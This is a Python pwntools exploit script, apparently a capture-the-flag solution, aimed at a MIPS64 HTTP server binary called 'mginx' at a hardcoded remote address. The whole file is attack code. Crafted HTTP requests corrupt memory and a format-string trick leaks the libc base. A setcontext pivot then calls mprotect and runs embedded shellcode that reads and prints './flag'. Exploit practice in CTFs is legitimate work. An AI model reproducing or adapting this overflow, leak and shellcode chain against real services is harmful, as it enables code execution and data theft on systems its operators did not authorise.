from pwn import *

cmd = "qemu-mips64-static -g 1234 -L ./ ./mginx".split()
#cmd = "qemu-mips64-static -L ./ ./mginx".split()
e = ELF("./mginx")
context.arch = "mips64"

isRemote = True

if not isRemote : 
    p = process(cmd)
else : 
    p = remote("124.156.129.96",8888)

pay = ""
pay += "GET aa HTTP/1.1\r\n"
pay += "Connection: close\r\n"
pay += "Content-Length: 2035\r\n"
pay += "\r\n"

p.send(pay)

sleep(0.2)
#raw_input()
for i in range(2) : 
    p.send("11")
    sleep(0.2)

#0x0000000120001CA4
pay  = p64(0x000000012001a250,endian='big') #gp
pay += p64(0x000000120012398-0x88,endian='big') #fp stncasestr
pay += p64(0x00000001200018C4,endian='big')
if isRemote : 
    pay += p64(0x00000001200122F8+3,endian='big')#for leak
else : 
    pay += p64(0x00000001200122F8+5,endian='big')#for leak

pay += "B"*496
pay += p64(0x12001a368,endian='big') #gp
pay += p64(0x0000000120012370-0x88,endian='big') #fp will attack strcasestr(0x0000000120012390)
pay += p64(0x120000b68,endian='big')

if isRemote : 
    pay += p64(0x00000001200122F8+3,endian='big')#for leak
else : 
    pay += p64(0x00000001200122F8+5,endian='big')#for leak

pay += "B"*8
pay += p64(0x000000012001a250,endian='big') #gp
pay += p64(0x00000001200018C4,endian='big') #read

pay += "A"*8
pay += p64(0x0000000120012398-72,endian='big') # $v0 of setcontext 

pay = pay.ljust(2031,"3")
p.send(pay)

sleep(0.1)

pay = ""
pay += "POST a a\r\n"
pay += "Connection: a\r\n\r\n"

pay += "%LA%LA%LA%s"
pay = pay.ljust(0x28,"1")
pay += p64(0x0000000120001524,endian='big') #case
pay += p64(e.symbols["malloc"],endian='big')
pay += p64(e.symbols["perror"],endian='big')
pay += p64(e.symbols["setvbuf"],endian='big')
pay += p64(e.symbols["printf"],endian='big') #snprintf

p.send(pay)

p.recvuntil("163520X0P-4087")

leak = p.recvuntil("1")[:-1][::-1]

if not isRemote : 
    leak += "\x00\x40"

libc = u64(leak.ljust(8,"\x00")) - 0x5d7b8

print 'libc : ' + hex(libc)

sleep(0.3)


pay = "GET a a\r\n\r\n"
pay = pay.ljust(0x0000000120012390 - 0x0000000120012370)
pay += p64(libc+0x1f4f8,endian="big") #set context

pay += p64(0x0000000120012390 & ~0xfff,endian='big') #a0
pay += p64(0x1000,endian='big') #a1
pay += p64(7,endian='big') #a2
pay += p64(0)*5 #a3~a7
pay += p64(0)*8 #s0~s7
pay += p64(0) * 8
pay += p64(0) # gp
pay += p64(0x0000000120012448,endian='big') # sp
pay += p64(0x0000000120012448,endian='big') # s8
pay += p64(0x1200125c0,endian='big') # shellcode
pay += p64(0) * 40
pay += p64(libc+0x23420,endian='big') #t9 mprotect
pay += "\x24\x04\x00\x01\x00\x04\x24\x38\x34\x84\x20\x01\x00\x04\x24\x38\x34\x84\x26\x0c\x24\x05\x00\x00\x24\x06\x00\x00\x24\x02\x13\x8a\x00\x00\x00\x0c\x00\x40\x20\x25\x03\xa0\x28\x25\x24\x06\x00\x64\x24\x02\x13\x88\x00\x00\x00\x0c\x24\x04\x00\x01\x03\xa0\x28\x25\x24\x06\x00\x64\x24\x02\x13\x89\x00\x00\x00\x0c"
pay += "./flag"

'''
  0x1f4fc <setcontext+76>:	ld	a0,72(v0)
   0x1f500 <setcontext+80>:	ld	a1,80(v0)
   0x1f504 <setcontext+84>:	ld	a2,88(v0)
   0x1f508 <setcontext+88>:	ld	a3,96(v0)
   0x1f50c <setcontext+92>:	ld	a4,104(v0)
   0x1f510 <setcontext+96>:	ld	a5,112(v0)
   0x1f514 <setcontext+100>:	ld	a6,120(v0)
   0x1f518 <setcontext+104>:	ld	a7,128(v0)
   0x1f51c <setcontext+108>:	ld	s0,168(v0)
   0x1f520 <setcontext+112>:	ld	s1,176(v0)
   0x1f524 <setcontext+116>:	ld	s2,184(v0)
pwndbg>
   0x1f528 <setcontext+120>:	ld	s3,192(v0)
   0x1f52c <setcontext+124>:	ld	s4,200(v0)
   0x1f530 <setcontext+128>:	ld	s5,208(v0)
   0x1f534 <setcontext+132>:	ld	s6,216(v0)
   0x1f538 <setcontext+136>:	ld	s7,224(v0)
   0x1f53c <setcontext+140>:	ld	gp,264(v0)
   0x1f540 <setcontext+144>:	ld	sp,272(v0)
   0x1f544 <setcontext+148>:	ld	s8,280(v0)
   0x1f548 <setcontext+152>:	ld	ra,288(v0)
   0x1f54c <setcontext+156>:	ld	t9,616(v0)
   0x1f550 <setcontext+160>:	jr	t9
'''

#raw_input()
p.send(pay)
p.interactive()
